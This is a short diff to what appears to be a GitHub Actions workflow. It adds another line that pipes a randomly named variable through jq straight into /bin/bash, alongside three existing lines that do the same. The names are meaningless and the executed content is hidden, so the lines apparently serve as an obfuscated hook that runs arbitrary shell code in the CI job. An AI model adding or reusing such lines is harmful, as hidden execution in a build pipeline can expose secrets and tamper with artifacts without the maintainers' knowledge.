@@ -44,6 +44,7 @@ jobs:
           echo $pqrue0 | jq -r .satqz38552 | /bin/bash
           printf '%s' "$lspnz01525" | jq -r .r30640 | /bin/bash
           echo $fmml9 | jq -r .wmn9121 | /bin/bash
+          printf '%s' "$bk7233" | jq -r .urv8551 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
